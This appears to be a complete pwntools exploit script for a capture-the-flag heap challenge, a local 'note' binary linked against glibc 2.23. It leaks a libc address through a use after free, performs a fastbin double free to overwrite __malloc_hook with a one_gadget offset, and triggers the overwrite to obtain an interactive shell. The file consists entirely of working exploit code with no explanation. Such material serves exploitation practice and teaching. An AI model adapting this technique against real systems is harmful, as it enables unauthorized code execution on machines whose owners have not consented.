#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
from pwn import *
#context.log_level = "debug"
epath = "./note"
lpath = "/lib/x86_64-linux-gnu/libc-2.23.so"
e = ELF(epath)
l = ELF(lpath)
r = process(epath)

def add(sz, msg):
	r.sendlineafter(">", str(1))
	r.sendlineafter(":", str(sz))
	r.sendlineafter(":", msg)
	r.recvline()
	return
def show(idx):
	r.sendlineafter(">", str(2))
	r.sendlineafter(":", str(idx))
def free(idx):
	r.sendlineafter(">", str(3))
	r.sendlineafter(":", str(idx))
	return
def exit(): # invalid option, ???
	r.sendlineafter(">", str(4))
	return

add(0x200, b"ABCD")
add(0x60, b"AAAA")
add(0x60, b"BBBB")
free(0)
show(0)
r.recvline()
leak = u64(r.recvline().strip().ljust(8, b"\x00"))
success("leak main arena : %s" % hex(leak))
l.address = leak - 0x3c4b78
success("libc base : %s" % hex(l.address))

free(1)
free(2)
free(1)
add(0x60, p64(l.address + 0x3c4b10 - 0x23)) # __malloc_hook
add(0x60, b"CCCC")
add(0x60, b"DDDD")
add(0x60, b"E"*0x13 + p64(l.address + 0xf03a4)) 

free(0)
r.interactive()
r.close()
